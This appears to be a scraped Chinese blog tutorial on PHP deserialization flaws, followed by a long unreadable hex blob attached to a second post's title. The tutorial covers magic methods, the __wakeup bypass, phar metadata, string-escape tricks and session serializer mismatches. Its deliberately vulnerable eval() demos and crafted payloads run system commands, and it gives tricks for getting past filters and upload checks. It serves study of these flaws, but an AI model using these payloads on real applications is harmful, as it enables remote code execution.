123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151&lt;?phpclass Test{ public $public; protected $protected; private $private; function __construct() { echo \"construct\"; echo \"&lt;br&gt;\"; } function __toString() { echo \"toString\"; echo \"&lt;br&gt;\"; return \"\"; } function __call($name,$args) { echo \"call\"; echo \"&lt;br&gt;\"; } static function __callStatic($name,$args) { echo \"callStatic\"; echo \"&lt;br&gt;\"; } function __get($name) { echo \"get\"; echo \"&lt;br&gt;\"; } function __set($name,$value) { echo \"set\"; echo \"&lt;br&gt;\"; } function __isset($name) { echo \"isset\"; echo \"&lt;br&gt;\"; } function __unset($name) { echo \"unset\"; echo \"&lt;br&gt;\"; } function __invoke() { echo \"invoke\"; echo \"&lt;br&gt;\"; } static function __set_status($arr) { echo \"set_status\"; echo \"&lt;br&gt;\"; } function __clone() { echo \"clone\"; echo \"&lt;br&gt;\"; } function __debugInfo() { echo \"debugInfo\"; echo \"&lt;br&gt;\"; return null; } public function __serialize(): array { echo \"serialize\"; echo \"&lt;br&gt;\"; return [ 'public' =&gt; $this-&gt;public, 'protected' =&gt; $this-&gt;protected, 'private' =&gt; $this-&gt;private, ]; } function __unserialize(array $data): void { echo \"unserialize\"; echo \"&lt;br&gt;\"; } function __sleep() { echo \"sleep\"; echo \"&lt;br&gt;\"; return array('public', 'protected', 'private'); } function __wakeup() { echo \"wakeup\"; echo \"&lt;br&gt;\"; } function __destruct() { echo \"destruct\"; echo \"&lt;br&gt;\"; }}// construct$test = new Test();// toStringecho $test;// call$test-&gt;fun();// callStaticTest::fun();// getecho $test-&gt;private;// set$test-&gt;private = \"private\";// issetisset($test-&gt;private);// unsetunset($test-&gt;private);// invoke$test();// set_statuseval(var_export($test,true).\";\");// clone$test1 = clone $test;// debugInfovar_dump($test);echo \"&lt;br&gt;\";// serialize$ser = serialize($test);// unserialize$unser = unserialize($ser);unset($test);unset($test1); 顺便说下，__serialize和__unserialize这两个特性在php7.4以后才有效。 PHP反序列化特性__wakeup绕过__wakeup绕过利用的不是php的某个特性，而是一个有CVE编号的漏洞，不过在我看来只是个bug，不知道为什么能分到CVE编号。受影响的版本为PHP5的5.6.25以下和PHP7的7.0.10以下。漏洞的利用很简单：当序列化字符串中描述对象属性个数的数字比实际的属性个数大，则反序列化时__wakeup方法则不执行。 利用场景嘛，就是以下这种__wakeup方法有替换或者过滤的情况。 123456789101112131415&lt;?phpclass Weakup{ var $command; function __wakeup(){ $this-&gt;command = \"phpinfo();\"; } function __destruct(){ @eval($this-&gt;command); }}$obj = unserialize($_GET['obj']); 以上payload中，序列化字符串描述属性有两个，但实际只有一个，绕过了__wakeup，command参数没有被替换为phpinfo，执行了我们的dir命令。 phar反序列化直接的php反序列化使用的是unserialize这个函数，但很多时候不一定会有这个函数，这个可以利用phar实现反序列化。phar是php的归档文件，phar中有一处存储序列化后的mate-data信息，通过phar://伪协议，配合某些文件函数就可以进行php反序列化。 生成Phar归档文件的代码如下，从seebug上CV下来的，setMetadata方法的参数就是需要序列化的对象。 1234567891011121314&lt;?php class TestObject { } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 第一次运行可能会报phar无法生成的问题，按照报错信息在配置文件中把phar.readonly关闭即可。 打开生成的phar归档文件，在里面可以看到序列化后的TestObject对象。 然后就可以使用文件函数配合phar:\\\\伪协议，进行php反序列化。可用的文件函数如下，也是用的seebug的图。 写个Demo测试下： 1234567891011121314151617181920212223&lt;?phpclass TestObject{ var $command; function __wakeup() { @eval($this-&gt;command); }}@unlink(\"phar.phar\");$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");$o = new TestObject();$o-&gt;command = \"phpinfo();\";$phar-&gt;setMetadata($o);$phar-&gt;addFromString(\"test.txt\", \"test\");$phar-&gt;stopBuffering();file_get_contents(\"phar://phar.phar/test.txt\");?&gt; 顺便说下，我用php8测试phar:\\\\伪协议的时候发现它不会进行反序列化了。网上查了下，P神的文章里说php8里的Phar中的元信息不再自动进行反序列化了。 关于phar反序列化还有两个trick，当代码中有过滤，传入的文件名不能以phar://开头，但在前面加上compress.zlib://还是能反序列化；phar归档文件的stub标志只需__HALT_COMPILER(); ?&gt;，前面可加上任何内容，可以绕过文件头检测的文件上传。 字符串逃逸在php中是靠描述的长度来识别字符串变量开始与结束，以分号;来分隔，以花括号}来代表对象或数组的结束，所以像下列代码一样，字符串变量中的双引号花括号或序列化字符串后加上点内容也丝毫不影响反序列化。 123456789101112&lt;?phpclass Test{ var $test;}$unser1 = 'O:4:\"Test\":1:{s:4:\"test\";s:12:\"testtest\"}}}\";}';$unser2 = 'O:4:\"Test\":1:{s:4:\"test\";s:12:\"testtesttest\";}\"\"\"\"}}}}';var_dump(unserialize($unser1));echo \"&lt;br&gt;\";var_dump(unserialize($unser2)); 因为这种特性，如果在序列化后对序列化字符串进行过滤或替换，使得替换前后的长度发生变化，一边情况下会导致反序列化出错，在加以利用可造成字符串的逃逸，修改其他参数的值。 根据替换前后的长度变化，可将情况跟为两种：替换后长度变长、替换后长度变短，以下分别分析这两种情况。 替换后长度变长12345678910111213141516171819&lt;?phpclass Test{ var $test; var $command; function __wakeup() { @eval($this-&gt;command); }}$test = new Test();$test-&gt;command = \"phpinfo();\";$test-&gt;test = $_GET[\"test\"];$ser = serialize($test);$ser = str_replace(\"z\", \"zz\", $ser);var_dump(unserialize($ser)); 这个Demo的目的是要把commond属性替换为我们的命令，需要逃逸的字符串为&quot;;s:7:&quot;command&quot;;s:14:&quot;system('dir');&quot;;}，替换前后的长度变化为由1变2，那令z的长度等于需要逃逸的字符串的长度即可，最终payload为： 1zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;} 替换后长度变短123456789101112131415161718192021&lt;?phpclass Test{ var $test1; var $test2; var $command; function __wakeup() { @eval($this-&gt;command); }}$test = new Test();$test-&gt;command = \"phpinfo();\";$test-&gt;test1 = $_GET[\"test1\"];$test-&gt;test2 = $_GET[\"test2\"];$ser = serialize($test);$ser = str_replace(\"ab\", \"\", $ser);var_dump(unserialize($ser)); 替换后长度由长变短，似乎需要至少两个属性可控才能逃逸字符串。第一个属性用于减少减短长度，第二字符串用于逃逸字符串，需要减少的长度为第一个属性的内容到第二个属性需要逃逸的字符串之间的距离。最终payload为以下内容。需要注意的是，长度减短后，test2属性就被吞掉了，逃逸时需要加一个属性使得属性数量为3，才能正常反序列化。由于php不存在的属性也能被反序列化的特殊，这里随便加个属性即可。 1test1=abababababababababab&amp;test2=&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;i:1;s:1:&quot;a&quot;;} session反序列化php中的session一般以文件形式存储，存储的格式又为序列化格式。php的session序列化处理器有三种，分别为php、php_serialize和php_binary，通过php.ini中的session.serialize_handler设置，默认为php。 php序列化处理器 12345&lt;?phpini_set('session.serialize_handler','php');session_start();$_SESSION[\"test\"]=\"session\"; session的格式为：键加上分隔符|加上序列化内容。 php_serialize序列化控制器 12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION[\"test\"]=\"session\"; session的格式为：$_SESSION这个数组的序列化内容。 php_binary序列化处理器 12345&lt;?phpini_set('session.serialize_handler','php_binary');session_start();$_SESSION[\"test\"]=\"session\"; session的格式为：一个字节记录键的长度，然后拼上键，再拼上序列化内容。这里键test的长度为4，所以记录的键长度的字节为04。 当程序员混用序列化控制器时，由于session内容的解析方式不同，再精心构造下可造成反序列化漏洞。网上的文章大都是php_serialize保存session，php读取session这种方式造成反序列化漏洞的，这里就先探讨这种方式。 php_serialize转php123456// php_serialize.php&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();$_SESSION[\"test\"] = $_GET[\"test\"]; 12345678910111213141516// php.php&lt;?phpini_set('session.serialize_handler','php');session_start();class Test{ var $command; function __wakeup() { @eval($this-&gt;command); }} 当test传入的内容为|O:4:&quot;Test&quot;:1:{s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;}，保存session时，php_serialize直接序列化$_SESSION数组；读取session时，由php解析，由于有一个分隔符|，分隔符前的内容被当成键，分隔符后的内容被当成序列化内容，并会被自动的反序列化，然后自动调用魔术方法__wakeup，执行了phpinfo。 php_binary转phppayload与php_serialize转php的通用，这里就不细说了。 php_binary转php_serializephp_serialize序列化处理器要能反序列化，php_binary相应的就需要以a开头，所以键长度要为116。总的来说，这种情况反序列化漏洞，需要session的键可控才可实现了。 最后的poc是这样，后面一串a用来填充长度到116： 1234&lt;?phpini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION[':1:{s:1:\"a\";O:4:\"Test\":1:{s:7:\"command\";s:10:\"phpinfo();\";};}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'] = \"a\"; php_serialize转php_binaryphp_serialize处理器开头总是a，转到php_binary解析键长度需要为116，所以填充需要放在开头，加上其他的序列化内容的长度要为116。因为Demo里只有一个键值对，所以payload的构造简单点，如果存在其他的键值对，构造就里会复杂点，甚至没法构造。 1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaO:4:&quot;Test&quot;:1:{s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;} 以上payload在php_serialize序列化处理器下生成的session，在php_binary里的解析方式如下： session反序列化小结其他组合的session反序列化跟以上几个也大同小异，总的来说，主要围绕着首字节和分隔符|构造payload。除了转php的，也就是分隔符造成的反序列化漏洞外，其他组合的session反序列化，需要键名可控、session内容已知、可控键值对在session中靠前等条件，利用难度还是挺高的。 后记PHP反序列化浅析终于写完了，时间比我预期的要久。水文章也是不能偷懒滴，希望后面的学习提高下效率吧，下一站，向Java反序列化进发！ 参考https://www.php.net/manual/en/language.oop5.magic.php https://paper.seebug.org/680/ https://www.leavesongs.com/PHP/php-8-0-release.html https://blog.csdn.net/qq_45521281/article/details/107135706","link":"/2021/07/30/php反序列化浅析/"},{"title":"基于ASP.NET MVC的easycms的easy代码审计","text":"4630436162ade97ba2718b7d0c4b3b63e244e44e44b3aaff61d8624b3ae55323b1b3363053478eb95a51fe488060c89e1c837f3ef59a5005b0efa9f918eac767f34bfec09066dbd844f27b991fe581ba6fbe0ee8520865ee5552763af42642e6766f7aa971c3158a9f15016d48e86532820839ebc92dc13654dd71b9139887d0e282e910a7f8c0740c1bb37f798b6f38f61558a06001d47522ebdf96a2a052a5c1cefdf985a00190d6755c855a7da5c98b2c12945ce6bd43cb537fab16fd733c4279e04581e5e7d32bdeff06b990db806d34105d506f0bb3b6bc1ed8d78ae0bd0d0435285aeeb1bdbb6dce1052cd8833e1dcbb8df766da5b0c3b9f85c253ab6bd88bd2fd9c4023076951a61387c5c81f83454d48ac52d776526d53ae598f0de3b36e464e31494ae2259c6d4e10701ebbe613af7e3713523ab62971291deb5dfc8bb8b2c5b83ba948875b13cdcf834af1c7a57c7afe9c56801f6a4b08d6cf82b2e3378c2120f3c37a94aaea1e4468a279879ee884e9fa00f17bf4e80f9b7fea9f8175849b7939a85750bf25fbd7664edb0f4576ea52739ff8cc00a8f0aba81988669afa6caf9553d661f91ffa134d26aaa6b309eb5c68f912e9990cd013221190605c0124ee6ae3efe0e4eabf235b1a304cc3cb592dafedf7b2532cad23e1b18940bfc64eafee1b347337033523b8ef6512384c8403651a3d9b2a2d375d90f65281ea76960b58796d0a1a563d7a2c4d0a56f95effa12ced4cad5f67fd38d62d257fe2f3870adcc1810b4f9aebf523fa3f327109e05f5ae4d58aa460dbcdf012f7fc83d955aa6921105975107f2654774c052a1ff4b57f7a0521ef21e0284766a3c479415afdc68f9c7857b5a3b9aca30a44b027412e8ca7ccc4bfc5f734162b41ab01aa097c1df18cf1d27a503e8e2a4550efcce4eed76ba0b62ec1f52b3163f35676225a13793f3432aba9586fd883c98152227cba38c0678eedffbeda027a931de2662a06561cfcc99e455c66d923f7fa2c0e0449cf527189d8c0d822bd6835baea964357a129090d48eb2e2add79cabd7fa21ce02af484c23065bfdff0a94c9776eff571bdec4b880248fb34a18febadd98a9a0945814bd1af46648e07d3e02ee7de53d64f7e4a6dc93efa9c5622611c552dd8ef431f5d544f3430bd9b773a5cdc47e6058bc9534bac338b9aca406fd6bd9a6c594d8a825b811f109bf5b4ba28d888f97334fc7b9b551982bc49787dc98297711d00b64b517513c69f140e56655e22d1744c03a226121cf52bb47e36d8eb92dbdcfb03636f75fdb9c079286da75094e9f48824ee2ef9c0ed49ade7f1194f4c24b45e7d446b7f34597c4953185ad9f0501357929c915c7f13c8f0883502f786be47059ca15cfd0b08a01250cd6c7b7fe79c99dd5c6d7c00efe874b90cbbebd8c2987c312b923cddac16e3544c9e3504187bdad6230472beb0b18878c8fa649923cc397c69eaf11cee2d66885c6623b7762c6c86cdcacc5d06bbfd43b637da649ee162ce25c3b8abf8c0e7321ac2820f8858a8811bb2fced01ea33eb61a50b7562c602200e9b3c88fda6cf2843f46d808fd7d65af5af7081f521b1289486973e6cf80cf9b1664425ef0adef09e9feea5f382f3cf0a2e5226e5a336204c9672f67a9b1ad4a3c838d75976355a2a402124acd7ef5a88957c411e67fe821cce17ca99b8befcea77e2e2030874131b8e20e1db2cdb65659933d5fa92cf08a5e3dbeebbc0f6cdbe73b699cc26f4c8e5593d76941af70993c6b07453fbe5ee0de6441f01ab111b6f12b2763e2d72471301c9639b6848511facf5aacf3c2fa62a2181bf09ddf0f3d02dc9e418c7d99ea24056d577479360e16fe6b93f60966edb6c88d1c177fbbd2fd96cb59ad530063cf112aad774d46aad6dcb9f9b8a166c6d1b5068f7b2101b7d17c767cc1327aecb601a55e97e070b0633a2962d1646e1f73409dc2658eaa6956b08bfd974307ea7b2d3bf600cb03cd7f05a1cb0491022c5c450837af6759b2afbe25147644cf05cec0ea24186000b662511760fe39f7b234f41db3b11df7f29ac8f17b12e66e5aa6db2f47445219ba4d7fe2a9e3983d28ed10e77d520478f4c7b267585a679c65f91a9c6683a229d7b036897f92abb1465578fd53d77db4f763e1327ba7c1fb57a28695aa173f489f1d0c0d9d70ad3fdb708f5f8c75691de92e9f874427a12cb2d34e207fc7fe473d48ecbf7f62ad8c64f49a016d5c9a962cbb46567ccfd2ff9f596643523dbf9c3eeb4e093c65d88b2bf173580b68938c7aabee45c8dab3a77a571955e41567961c1d17a54383022ccf2f2a50043973a2a6ca9a1a121ebc67ff870a9843e4bedece136d46aff3df558a5346d8f7b9e19fd7a528036b3b9d1d79a9b865ae5163d6fae65c4283da27ff44ee5c7625880e4f19d2e3db85f926657c36fbe53239628a8d14a3ee33a1d8b1d086fa07ed5cb6b770cf5c064f4c482313388ffceafcb3e21ad13ae5d2907384d89dd6847095c6d85a0b028c1ebc65a1c9e23b0306de2faaaa08449e530b1c62df0bb4e2588873cb9738f2a2c2e25b296f667a238b54e75b8750211aecb8c88ba2bcac6cdefae90e8ae42fa6b5177338d199dad798d65cad5abadb0c9c534e30df32203be30557119dcd487847a4d1e7c0a6fb452313bdd61c413093c1736d4f336caf787086697a137119b68fa74526140ada936229bd08d6b74c001ce89f6238e088212861d61b56acc2b7c5281240ede2f4397f6c586c525ab2879106b1ab8403ac47dc970b0f4983ff5f06a651a9727c9884861ef64edf6e543d335d6565621e0bc77bcccdc2f7e2893fa48c356e18ced1dd938ee95f88c3bfe1281e8eeb55be2d035d05d7ed6394596308a875d8cd902d8ddd60b40f2ad22469fc6ca7d684c11ec44051d32c7383f29dd21ca18f42a9d219464b8643faed591bc4f89099c1b9ae4af91be5599f17fd517704407fcf36cbd7c46854026f19a0e0831852442689c04354f121e511cdcbd0afd465eba4e3acd0a6bb4dcad52463b42e6c505535d5879bbe54a0d03410b02a30f5c50cb24cd713301ac0d87b05ad0e9d142b48e0ccaccf9833ea734dc688f25675fabc51fd9fc3b66e2aad09641b903fed6a086ba736fa82c26d787110dadd26d8e8d1628181a191d39988713b3fa3e1ff159b8cec979e4dcb02d249819e9cb14e071332aa5145633184e733f06da7cc8b18819da9f2f2f798babf84e3ecbac851e3f91072f829f31f804e6a9bd7ee474fe0109c4f2d269e319c802d33ad7313a562ff57ce62eb81414f713ead7a127868d759d8054968d8d7e3ea92cbdb6a83ea1812a59b432497eb1d0786d66d1316335635a8145e2d44e9be46cc05f58dd6dcf718030d3f606b4053c5cba0e3247a002293997c7d00bb0b852e801736e2801e5c5b10daa942a4002f0887b5a4e79516998e2b539e6b1e71ef63b11a8b5dcf8ee2a15432694f8210d310bb62ab548af8e37f21610945289cfcd12ef23abb91e0b876db974bd458ff2424c929d82ab11732b66a238c6f2e07c5cd8b2ae2ca6b9aa6aca0b1f584e2cf7508dcd0c8add34825ec08b439c3300dcf3e05f3ceb83e372a395e845c80703a63dfddee55bc4a994deb23315d36e45880110f60e71c1538de031e1aa0d3d34b18f3ec0b07045540a068e878dfa2d7cec7d0d798fdb515127e567ad14194bd90f9fac0d120fbad8efb4ad2248f77b0ea22731a0a07e41205e582b92e5123f17c88842a2138c5f7a2ca1d5cf0f5acf395e69c7d8832602a9ce80d0afbefa74062c63e02084954ff680a6a36f3b35121228ee0d2285398ee5d7175a6cbbc4f51e0210d4f9632eafb20f50e9e96d66d03c4c4b0c031cdea7d05829b15fc9605b28fc79e725ab6b7f4cff4039f56b3352dc58d3006f35cfdb5558b02f9582728e138663bc5f9936fa48d07a6bbd20a244d31663295ee4577d8fa47114f176d6ac85eb0ffe269ed9d266a4abfc2e81e813b9aadfadcc656771ae51437cffdeabd0aa82c7fc47190aeb9d4b1f1d506c01c1cd3a1abc9b7a1b1fcf5bc51e87083e411d1b43d2f6931988f8643584ebea8a400a03e2334747efdd254e94d7a1e4133d12cbe90b6013f5820dd23e603a278d33ee8f7e5362210304a1596dd0b7dc25b9e67fbbe4d5ce188900f0ee13ba39259467b1eb48a161da4df3cce567743766cb99fd0061ac72a921f38df5d7a1230ee2b69d502775f3d468d14e12a3f764af6df2c41bc6a4e9c6331081bc27edc2599f926f3ad2f5b1136229f829e7677613a68e3f7e443cc055d05a8abeadf18bbc0c8c9e122b77916f604ce0a3018b4be59e89ccd2aed673838998b1f34c404788300f9afc05a2214b4e6ef75ca10f86480340338aa772b6260890bd76478c3f4cabd3644e2bd0f4b326dc6368de22a8277dd8fb3ce74e94a72d1a8070c2ed84a6c515ab072d394f3c525799225b5f4bab005ad53f636d3eedac5b3176d4b6f75118a26de2098bf2feb2d2387e92c852b98cdb0b2501e4faa6830d6b88af3b7aa045fe59f071ac4fb668aa6ef904ddc5a8ebb428422ed20816e9cd32d5fd15e9ecfde00ac0473e866f785c508bc5f254dc091acdb6d5d5d505b75f09f6db35208d3fcc357462e01d7951b3111e6941b3c64bdb8d083bc6a9b2173f483979fbbe51f9b1da2bce93898ef141dba76927388c37e309771e14969770944a84d719e1f33f669e6719cb33f24f87f9c3fb384a4c82fa44106c4bba02230066535be908ffc5b67f37607fd13c41b8c6797cd2dd11f262472d52ba7e214a9c05b339110489518bc30afe3947bb1edcf8dd355143d2fd87a5904007911fadc4fe95a660334b859f0bf6da6482752f84b77169d3d796c8c4fcf6477e0d4f57040df36be3b9a68cc469c1fbe131c4902fa3511f504634ac794145b9ce64b60b2b9a389afd75233f8fe34f5aaa98fcf0d039d3b41f51a5d4e57efea733c62053bac63d3ab0237375f14025134d94cab52d93a8e42b33a1179ddcd4991f41e634944d43fa783b7d388fe816daa4d31520db5c2d520731f8f8f7a063e8b996a58c685fc79b9cf0adbdfdd99e9866385d66eda6b7a67848a46a4bc0069c86fd444f8ab05a36df99b70b1e16a45609dba72945d872f1564e6fa3f80a13f27647af29c1b9d708bd2030fec8dc94d46ec4ed751c7f0515490ce89e5bbc5a7d08bc4c658aa15e1f1783c20a21d34f1f9d2e8157a6f0ce93c39f46d2ff29d048fa8aff852929f550b12e83ad04c0463360de745a5f0300e890a9254992b4358d08eb9be9ca083f7df9c23f572e3301aff5310bc54414adb51fbfd2afe07f2c80e5987ae08f4f320646cbbe84ab661000e453fa673ad2f401ef3b60688f7e1184b2054786401201354a98c24f45c806ba13f7375bede43f4dac928e1119ec1ead53cd812db5b3d903c72e7d4086941b5d47ae64fabb945d044afa7d644d1ab58c2f756f349ee44d4322d2d560e70c366e27203f79ff59a05d8b2326df7849d5d3fe9a964e1350cd6fe4d6ffab4afd518de40dfd861396a2e35c084f887bcc58c6b20335252524a6ce4d1435e9dbb7b61c695014c498f9127a8d1734779a6c083c3a9ce3fcd9dd4470930c39b188b1d1ca34fd58c0e0d42e1604e64d7bac500bb6c256f64294d9e1c041b69b9617398e4ac3960b812d7934195222fa0177e94c144f4c8a19d3f46acd00e1e53747cd99f4ac41baea4191d4f6bd4da81673c290a5018067b12551e581a4e21ad2c401b03838d57c0dd690bb8971214cae6d8a2a59075a5fead36eaa4c3690938acac777e3d92a8d6c1585211837d10ed720f697289a60c305c0ed6c663a61bd6fdcac5a38a48ab7e0c7c148f62e25a33cd659586d3991976a07997efc0aea1ef2395cf1fe230d3e0713c912d5d6d1503514e0d3aaa36adf8f6ffe3a46fc8f94d5c124746c72b007dd26c2e25a600eeacc7ce7670ef44a756af10e28fbdf64d9d8b6856d10edc71a5695a117d7b784ef6494ef560a1729cf27543ca0f76cac4db4bda721567d21d002b6b02202300e834d15a55f8daf0659a1d500256efafc821865b56493bc1c79bba23a9768aee8c5353ea96e0835a1434a6bf2110db9e920fd0c04411ea1dce897b469a596393e52ff855dc208c14dffbfe0746a615762330db871f7a8ae444a15f3fc79a22a8c748362fa1d27ada02f8db349624e02199376f10e7c69b52e806ee0d4ce652e956c6b374199cc202f04628897b763895323f29701282abdb86d6a92fde4573bd7b4b6da007dab06d7624b2ab46508cc320650eafa5d9fbace20802c6720efc1619ee1fc11e750c7fe08d8215836d51aa089fcaf03a86bbc0713829062ce06ed742be9d6e2acf42f5c899eae47cf667072da8b852874981d7dce912e9f5bf9994cd22f2c7dab7f91b81de2cb8bc7e98b97d9f79b4090f0a748366a401b744fccd00ea8b907e01d3abb52c5f27f7d83f91c01ffdd371dc6f9b49775192bf24f4c3d62f35a336dad9e3b9049a44124469bf83a62fad04b7eed3d2c44cf441a3fda3ef6580255ff67a6f1bd65aeefb948383e43c698b2d9cc61bc6e77f461b55bdcea7b79229c0361d05312a508e4e6a6e3e0336995652064e501e7a25873097b2d5089d058c8c1777e4458099adff48b323e42cd23c7eac8e8139c0a954898476e15bca92fbff755c8907b65b22728197cfdc506173388c805a38cb6200d975503f5bf1e02217fb88fa73828540e8b6e96b1e0c2b0cc93eded3129248c4619a05e83a3cb58a96ec35998a3b3fccbaeda81f42f6d7fa6ca0b098e19bc75e2b24ef0bd9697bc983ed31f3757f94cfa88aa6228740483f2d5df5e0fc94d997da9c931f4862f08dbea8616803e6a1334e8db6f437dda07abb551d7cbecba62ccff784e17f3ea41c0a4a176288266c19733561cfb9babe3884bc08f211bd02ef2edd9e3cc16710ce1a840b67c89503f6ca27be5b3521bfc489e05bb6e289bf524e7da557c4caeae70b5faf03cb626ed2dc4b046958c5aefc5448178ac1aca728a64f773c394a9da6c0e2ce4f02285ce4b10e67b88638571ea7bde023d6992243f16a52cfc3fdd3a39cebca35d97c9a6e8675f37c48fef6defcd22a64a67289735c98efa86a902b537464d63520c427269ebf95caa13919b63de9c1028c3f5fcd40b7ad0212c6acbd4f3812df5b5f257e56c83d35203d6357d4f38d667037181befbae8cef09b229da301104bd1b5daf8770dcc39dbfa350b608c3023c9dd48d1b926efbe24373be73dded8c46d0438390d5b14bc613b2fc5411165869b079c92d298b7d7100042d25a31ca65deae4c54d4e526a70e9c264906973d3e200f41548f0e6697626f47b24847a8723b6997cbb3569afb60925e37c080723a4bc57a9c54a917cbd28b267bb683ba5711b41e79daadb14a9f6c7c26c4013270594683dd4a92ac7b02e50fdd1b7c3307a5153414cfeec816dcdb34f0c69d25620ecc4dc5f1c176cdac2c497f0cd9bdc89a8c8507e916c021835d24ef52be756a6faa85f1249d46a96092941366fec93d23d58fed933316df43154a0fa14c3bc526e4a5bf4363cd47ecc4c6526618f2d0cf6f26d80db091dd0bfb7d0d88b719f091c0074bc180364adac420d305d6cb55c15aa96951e01b864ef582770a08758e513849afbda0c32bc76bfe79c4f5c481b2f3c87b9c8e0b7dbddd45f554879f964a5e3d91e5d291a216215245a0165f7ec95b5d325028a4809563138eba8426ffc3da5b1d8e56600e0f56aa976d8b7d1dc6e4890af74b203a13e32bcf906f39c114d9f786ea559c2215c088af40e853cdc3a00894c1b1ff21ab2e0deee95be69c7a377feacc13921fe9fb9b6fd52934c6af7f0f7a57a25d2e1eb0280794824d75b6827f26f594ebf6d0f8d87c0a391075e2530895b2dd184c6ad43f60413f543767485c08564da82746e1b3365f8c8ade661e1746fa507664d0988770a369ac6d75a0b74e806db88d28f80fb19b6e0fc9341f097c85d1c69c8a6a0ff30eec5f8446af31dd7ee4a67e10192d315fd97370272bd3ffff82e26e72fef6ef820c2dfb626d5afd0dd4df81efa1bf032c8d2b11550699a6bf3f1fe03d51ebb9384a36fe027dc67aa78adf35044c62b97d00820b2affcfcfd3c993a205b42eee16928cd67f36feff57358d037be2d19e6c8426fbc1f595c2ebfc7e65390a7636942cf63a86af4fe7d2d6cba7b54b694bf1fb301db04b1c149b6cb9975240ad2c181c7fef4641a3e61e446798063a28a9091b4623ac1a69f24b36c5e6fe3641af3732bb747152144a5bb597c2cc98c7c72ca8a9cefd9c48ca45756d23067c912922c2b16a2ae816e80f4033c92d6fb8da3781941b06393213ffbba205e2d9e5222b749b2c56b58a5054e10f9ed3b469ccf887572ce1a8dce0b1af715586f1e5aa4e8c924edd6a48c73c91adb35fc95dad90b25a5f8ce3d6fd122fb62b7fd3f1d40545b93883f319823f145325e77dd640d254dd4a07a8e3c88410f97fa7b45abd8b7f945826fe01a76bb13e80a108bdaf858c76255075a715e73fa539b27a4c77bae044ef460872b53db3ff9d6ed16cec7933e873323b49ae2c7448f516dceb6f33b9d10787310f4a00da3df6b071c2abbca94a001119281b75cf567cd5f19e89454e580c6e9f598a7306654ebf70ae01becc085588cd6ee99bd196e772f29b38594caa56bb073c4f08fde7ddcd63fccbd24908e8f040d6a356a7096bac1ac2312806021027b7f870db96c6dc2baf4c1f684b45e8d16016cf15f5c33a9a770a0eeb7679ed32120ff057e89946eeb830d17846b6ced9d9cb4feca664f56de621d87f93798a4e4e57f0d06b28e5efe7d0d1d1bd860926ed8ffa96b311466213fca2fa0f0f1c94e25ddc3d84b58679e3d73cf26a92997447d067bc26218a205883310a5165951e6035a87332b029f2a67eeae55258b53b7dac186b1e57e36fdb4623af1d4a3f1253d4f6ef63a2e30b56aeb5e2fb9a0539bec7553600e85a01b3027482ffc5a5c87f987c0a1ac281fd3eba62307541a0a4512aaa5eb6286b0d83930b543f04326639995855c64f031672a61f9c1570c138ebd8050af224f683fe3e918711f57d78e2422cee2f3d84f1838cafd16dcfe47fea19745cc82f0a0b658c1a2469eb1f0b332b809e7ce44d5eaf1437af9fd030e4019f39d794f6f584f96e910386492b227dbaed8113228ccff79f9beff245e034e7b729d5c09020d198d1d87bd27885faf0b2e8413898bb2def039c34f6891600b2e720ad8fc1546f3baa2bce475fd7a314dcd019d8a6f9f6662492774acf79e135accfd8111b3d536b7e2f296cbfc68d6e77c7f9e9634a72e015caff64082c07f87ec40c996c42bccfd84df0e6475b1d5e5a4c569aaec25032d14cd7543fc597242352961b2bf6a8e80ac2e525a02634df9684c3fae05b0db8907fb89b13b1e62de5b4f16d39f859c134367a5773c85f831f3963196d1fe88966be3292436d1771fbf7333688f43e897ee8bffc634e1fee71ed41d67e69f900a0c499d93617e15d46a6d6774c465552bacfd352a3a958a08a077fa9c27fb6390ff216ebdb38f559632ab8cb72d22d11f184dc4c1449a30eef0db1e87ce71e8e6db5a29e31e5af6884b87c0eada901d14debaf1644d50acd1951ffa1ac923b3176b83d04a3afcee86734d1f471490bb52c67b1d47a9583beb609e1093d6f6d400cef647b30bd1b1c1cac4011d78874e212da3c6d5fafe2ca81576bf37708e6d3aa009914ce0d994ced10c1703c21599d05bf6bc1c7a80fa599b5b82bd345705582e07cbb5a723799f9fde899be34b51ff2e46e6aa978e523214037f6d1b12ab75424fccf623398fc07999489db903fdf85efb412ce31d8332ad698df1d831bd93f41cb1d687d27d1f680fe18075976e147f0695a070b68fbef2887bfcb1a08ea079382c8fa533231e6807d32816dd767b1862411cc1f3443fcfc972d0db01f8c791f121e7df3a21cbf0746b25be75c56ef8c5f03b90fea0b6c701cfb2bc0898499a1daee548ef71ac3eb6e62fa21eaf0d49543cfb0e3ab5b9f4dc736cc5259523372f222ee22115324966d13545d03374c714910fdcbf85c71c5d135451ebfafd5816934bdf35d8e30d3b6117e47d91b55d965540a1b8a925fa92c6fa98de103635c1593ecc5dfa98213fb793251b6a7efbf19964b26ecd3444ad2f032faf24816d3883773058bfc067d688817acde2f37f76b641b73ddaaa0a93ae054394441278ca26327491e45bb98f8d6de9836dbff130f34b63b7afef7b196adf6ae602329316f59d30f20d56def8b58cc2a532d11c8b92115241bb29e390e5d4e85054fb3f61f237ad97108687e3d2f018f84e47ce5920b427f21af588b01051ca8d3fdb1559ace185b2c6f45d7760f57a86120f6e0a9928b02a447b